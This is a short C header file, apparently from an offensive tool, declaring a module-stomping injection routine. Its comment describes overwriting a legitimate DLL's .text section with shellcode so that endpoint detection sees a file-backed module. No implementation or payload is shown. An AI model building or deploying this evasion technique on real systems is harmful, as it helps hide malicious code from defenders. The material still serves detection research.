#pragma once
#include "common.h"

/*
 * Module Stomping Injection
 *
 * Instead of allocating fresh (unbacked) memory, we load a legitimate
 * sacrificial DLL and overwrite its .text section with our shellcode.
 * Result: the thread start address and memory region are backed by a
 * real file on disk — EDR sees a legitimate module, not suspicious
 * dynamically-allocated RX memory.
 */

typedef struct _STOMP_RESULT {
    PVOID  base_addr;     /* start of overwritten .text section */
    SIZE_T region_size;   /* size of the .text section */
    HMODULE hModule;      /* handle to the sacrificial DLL */
} STOMP_RESULT, *PSTOMP_RESULT;

BOOL ModuleStompInject(PBYTE shellcode, SIZE_T sc_size, PSTOMP_RESULT result);
